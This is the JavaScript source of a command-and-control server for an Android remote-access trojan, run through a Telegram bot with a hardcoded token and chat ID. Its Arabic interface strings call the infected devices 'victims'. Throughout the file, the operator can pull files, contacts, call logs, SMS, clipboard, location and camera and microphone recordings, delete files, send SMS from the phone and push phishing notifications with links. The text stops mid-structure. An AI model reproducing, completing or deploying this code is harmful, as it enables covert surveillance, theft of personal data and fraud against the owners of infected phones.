const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '6102199140:AAEV7RQLBaeqdoVjRtUzy6I9ngdLIQ_eXrk'
const id = '5800787132'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">ððð§ð«ðð§ ðªð¥ð¡ð¤ðððð ð¨ðªðððð¨ð¨ððªð¡ð¡ð®</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `Â°â¢ØªÙ Ø§ÙØ³Ø­Ø¨ ÙÙ Ø¬ÙØ§Ø² <b>${req.headers.model}</b> ððð«ððð`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `Â°â¢ØªÙ Ø§ÙØ³Ø­Ø¨ ÙÙ Ø¬ÙØ§Ø² <b>${req.headers.model}</b> ððð«ððð\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `Â°â¢ ðð¤ððð©ðð¤ð£ ðð§ð¤ð¢ <b>${req.headers.model}</b> ððð«ððð`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `Â°â¢ Ø¬ÙØ§Ø² ÙØ®ØªØ±Ù Ø¬Ø¯ÙØ¯\n\n` +
        `â¢ ÙÙØ¹ Ø§ÙØ¬ÙØ§Ø² : <b>${model}</b>\n` +
        `â¢ Ø§ÙØ¨Ø·Ø§Ø±ÙÙ : <b>${battery}</b>\n` +
        `â¢ Ø§ØµØ¯Ø§Ø± Ø§ÙØ§ÙØ¯Ø±ÙÙØ¯ : <b>${version}</b>\n` +
        `â¢ Ø³Ø·ÙØ¹ Ø§ÙØ´Ø§Ø´Ù : <b>${brightness}</b>\n` +
        `â¢ ÙÙØ¹ Ø§ÙØ´Ø¨ÙÙ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `Â°â¢ Ø¬ÙØ§Ø² ØºÙØ± ÙØªØµÙ\n\n` +
            `â¢ ÙÙØ¹ Ø§ÙØ¬ÙØ§Ø² : <b>${model}</b>\n` +
            `â¢ Ø§ÙØ¨Ø·Ø§Ø±ÙÙ : <b>${battery}</b>\n` +
            `â¢ Ø§ØµØ¯Ø§Ø± Ø§ÙØ§ÙØ¯Ø±ÙÙØ¯ : <b>${version}</b>\n` +
            `â¢ Ø³Ø·ÙØ¹ Ø§ÙØ´Ø§Ø´Ù : <b>${brightness}</b>\n` +
            `â¢ ÙÙØ¹ Ø§ÙØ´Ø¨ÙÙ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('Â°â¢ Ø§ÙØªØ¨ Ø±ÙÙ ÙØ£Ø±Ø³Ø§Ù Ø±Ø³Ø§ÙØ© sms ÙÙ Ø¬ÙØ§Ø² Ø§ÙØ¶Ø­ÙÙ')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                'Â°â¢ Ø§ÙØªØ¨ ÙØµ Ø§ÙØ±Ø³Ø§ÙÙ\n\n' +
                'â¢ Ø§ÙØªØ¨ ÙØµ Ø§ÙØ±Ø³Ø§ÙØ© Ø§ÙÙØ±Ø³ÙÙ ÙÙØ±ÙÙ Ø§ÙÙØ­Ø¯Ø¯',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('Â°â¢ Ø§ÙØªØ¨ ÙØµ Ø§ÙØ±Ø³Ø§ÙÙ')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
                'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â¢ Ø§ÙØªØ¨ Ø±Ø³Ø§ÙÙ ÙØ£Ø±Ø³Ø§ÙÙØ§ ÙØ¬ÙÙØ¹ Ø¬ÙØ§Øª Ø§ØªØµØ§Ù Ø§ÙØ¶Ø­ÙÙ')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
                'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â¢ Ø§ÙØªØ¨ ÙØ³Ø§Ø± ÙØ¬ÙØ¯ ÙØªØ­ÙÙÙ ÙØ§ Ø¨Ø¯Ø§Ø®ÙÙ')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
                'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â¢ Ø§ÙØªØ¨ ÙØ³Ø§Ø± ÙÙÙ ÙØ­Ø°ÙÙ')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
                'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â¢ ØªØ³Ø¬ÙÙ ØµÙØª Ø§ÙØ¶Ø­ÙÙ')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
                'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â¢ ðð£ð©ðð§ ðð¤ð¬ ð¡ð¤ð£ð ð®ð¤ðª ð¬ðð£ð© ð©ðð ð¢ððð£ ððð¢ðð§ð ð©ð¤ ðð ð§ððð¤ð§ððð')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
                'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â¢ ðð£ð©ðð§ ðð¤ð¬ ð¡ð¤ð£ð ð®ð¤ðª ð¬ðð£ð© ð©ðð ð¨ðð¡ððð ððð¢ðð§ð ð©ð¤ ðð ð§ððð¤ð§ððð')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
                'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â¢Ø§ÙØªØ¨ Ø±Ø³Ø§ÙÙ ÙØ£Ø¸ÙØ§Ø±ÙØ§ Ø¨ÙÙØªØµÙ Ø§ÙØ´Ø§Ø´Ù')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
                'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â¢ Ø§ÙØªØ¨ Ø§Ø´Ø¹Ø§Ø± ØªÙØ¯ÙØ¯ ÙÙØ¶Ø­ÙÙ')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                'Â°â¢ Ø§Ø¶Ù Ø±Ø§Ø¨Ø· ÙÙØºÙ Ø§Ù Ø±Ø§Ø¨Ø· ÙØ£Ù Ø´Ù\n\n' +
                'â¢ Ø¹ÙØ¯ Ø¶ØºØ· Ø§ÙØ¶Ø­ÙÙ Ø¹ÙÙ Ø§ÙØ±Ø³Ø§ÙÙ Ø³ÙØªÙ ÙØªØ­ Ø§ÙØ±Ø§Ø¨Ø· Ø§ÙÙØ¶Ø§Ù',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('Â°â¢ Ø§Ø¶Ù Ø±Ø§Ø¨Ø· ÙÙØºÙ Ø§Ù Ø±Ø§Ø¨Ø· ÙØ£Ù Ø´Ù')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
                'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â¢ Ø§Ø±Ø³Ù Ø±Ø§Ø¨Ø· Ø§ÙÙÙØ³ÙÙÙ')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
                'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                'Â°â¢ ððð¡ðð¤ð¢ð ð©ð¤ 7ð ðð¼ð ð¥ðð£ðð¡\n\n' +
                'â¢ Ø§ÙÙØ§ Ø¨Ù ÙÙ Ø§ÙÙ Ø¨ÙØª Ø§Ø®ØªØ±Ø§Ù ÙÙØ§ØªÙ Ø¨Ø§ÙÙØ·Ù Ø§ÙØ¹Ø±Ø¨Ù\n\n' +
                'â¢ Ø§ÙØ¨ÙØª ÙØ¹ÙÙ ÙØ«Ù Ø¨Ø±Ø§ÙØ¬ Ø§ÙØ±Ø§Øª ÙÙÙÙ Ø¨ØµÙØºÙ Ø§Ø³ÙÙ\n\n' +
                'â¢ ÙÙÙÙÙ Ø§Ø®ØªØ±Ø§Ù Ø§Ø¬ÙØ²Ù Ø§ÙØ§ÙØ¯Ø±ÙÙØ¯ ÙØ³Ø­Ø¨ Ø¬ÙÙØ¹ ÙÙÙØ§Øª Ø§ÙØ¶Ø­ÙÙ\n\n' +
                'â¢ ÙØ­Ù ØºÙØ± ÙØ³Ø¤ÙÙÙÙ Ø¹Ù Ø§Ù Ø§Ø³ØªØ®Ø¯Ø§Ù Ø¶Ø§Ø±. ÙØ£Ø¹Ø§Ø¯Ø© Ø§ÙØªØ´ØºÙÙ Ø§Ø¶ØºØ· /start .',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'Â°â¢ Ø¹ÙÙØ§ ÙØ§ ÙÙØ¬Ø¯ Ø§Ø¬ÙØ²Ù ÙØ®ØªØ±ÙÙ ÙÙ Ø§ÙÙÙØª Ø§ÙØ­Ø§ÙÙ\n\n' +
                    'â¢ ÛØ±Ø¬Ù Ø§Ø±Ø³Ø§Ù Ø§ÙØªØ·Ø¨ÙÙ Ø§ÙÙÙØºÙ ÙÙØ¶Ø­ÙÙ ÙØ­ØªÙ ÙØªÙ Ø§Ø®ØªØ±Ø§ÙÙ'
                )
            } else {
                let text = 'Â°â¢ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØªØµÙÙ :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `â¢ ÙÙØ¹ Ø§ÙØ¬ÙØ§Ø² : <b>${value.model}</b>\n` +
                        `â¢ Ø§ÙØ¨Ø·Ø§Ø±ÙÙ : <b>${value.battery}</b>\n` +
                        `â¢ Ø§ØµØ¯Ø§Ø± Ø§ÙØ§ÙØ¯Ø±ÙÙØ¯ : <b>${value.version}</b>\n` +
                        `â¢ Ø³Ø·ÙØ¹ Ø§ÙØ´Ø§Ø´Ù : <b>${value.brightness}</b>\n` +
                        `â¢ ÙÙØ¹ Ø§ÙØ´Ø¨ÙÙ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'Â°â¢ Ø¹ÙÙØ§ ÙØ§ ÙÙØ¬Ø¯ Ø§Ø¬ÙØ²Ù ÙØ®ØªØ±ÙÙ ÙÙ Ø§ÙÙÙØª Ø§ÙØ­Ø§ÙÙ\n\n' +
                    'â¢ ÛØ±Ø¬Ù Ø§Ø±Ø³Ø§Ù Ø§ÙØªØ·Ø¨ÙÙ Ø§ÙÙÙØºÙ ÙÙØ¶Ø­ÙÙ ÙØ­ØªÙ ÙØªÙ Ø§Ø®ØªØ±Ø§ÙÙ'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, 'Â°â¢ Ø§Ø®ØªØ± Ø¬ÙØ§Ø² ÙØ£Ø®ØªØ±Ø§ÙÙ', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, 'Â°â¢ ððð§ð¢ðð¨ð¨ðð¤ð£ ððð£ððð')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`Â°â¢ Ø§Ø®ØªØ± ÙÙ Ø§ÙÙØ§Ø¦ÙÙ ÙØ£Ø®ØªØ±Ø§Ù Ø¬ÙØ§Ø² : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'ÙØ§Ø¦ÙØ© Ø§ÙØªØ·Ø¨ÙÙØ§Øª', callback_data: `apps:${uuid}`},
                        {text: 'ÙØ¹ÙÙÙØ§Øª Ø§ÙØ¶Ø­ÙÙ', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'Ø³Ø­Ø¨ ÙÙÙØ§Øª ÙØµÙØ±', callback_data: `file:${uuid}`},
                        {text: 'Ø­Ø°Ù ÙÙÙ ÙØ¹ÙÙ', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'Ø³Ø­Ø¨ Ø§ÙÙØ­ÙÙØ¸Ø§Øª', callback_data: `clipboard:${uuid}`},
                        {text: 'ØªØ³Ø¬ÙÙ ØµÙØª ÙÙØ¶Ø­ÙÙ', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'ØªØµÙÙØ± Ø§ÙØ¶Ø­ÙÙ', callback_data: `camera_main:${uuid}`},
                        {text: 'ØªØµÙÙØ± Ø§ÙØ¶Ø­ÙÙ Ø³ÙÙÙÙ', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'ÙÙÙØ¹ Ø§ÙØ¶Ø­ÙÙ', callback_data: `location:${uuid}`},
                        {text: 'Ø§Ø¸ÙØ§Ø± Ø±Ø³Ø§ÙÙ', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'Ø³Ø­Ø¨ Ø§ÙÙÙØ§ÙÙØ§Øª', callback_data: `calls:${uuid}`},
                        {text: 'Ø³Ø­Ø¨ Ø¬ÙØ§Øª Ø§ÙØ§ØªØµØ§Ù', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'Ø§ÙØªØ²Ø§Ø² Ø¬ÙØ§Ø² Ø§ÙØ¶Ø­ÙÙ', callback_data: `vibrate:${uuid}`},
                        {text: 'Ø§Ø±Ø³Ø§Ù Ø§Ø´Ø¹Ø§Ø±', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'Ø³Ø­Ø¨ Ø±Ø³Ø§Ø¦Ù Ø¬Ø¯ÙØ¯Ù', callback_data: `messages:${uuid}`},
                        {text: 'Ø§Ø±Ø³Ø§ÙÙ Ø±Ø³Ø§ÙÙ', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'ØªØ´ØºÙÙ ÙÙØ³ÙÙÙ', callback_data: `play_audio:${uuid}`},
                        {text: 'Ø§ÙÙØ§Ù ÙÙØ³ÙÙÙ', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'Ø§Ø±Ø³Ø§Ù Ø±Ø³Ø§ÙÙ ÙÙØ¬ÙÙØ¹',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ÙØ­Øµ Ø§ÙØ§Ø¬ÙØ²Ù Ø§ÙÙØ®ØªØ±ÙÙ"], ["Ø§Ø¸ÙØ§Ø± Ø§ÙØ§ÙØ± Ø§ÙØ§Ø®ØªØ±Ø§Ù"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â¢ Ø¬Ø§Ø±Ù ØªÙÙÙØ° Ø§ÙØ¹ÙÙÙÙ\n\n' +
            'â¢ Ø§ÙØªØ¸Ø± Ø¨Ø¹Ø¶ Ø§ÙÙÙØª',
            {
                parse_mode: "HTML",
                "reply_markup": {
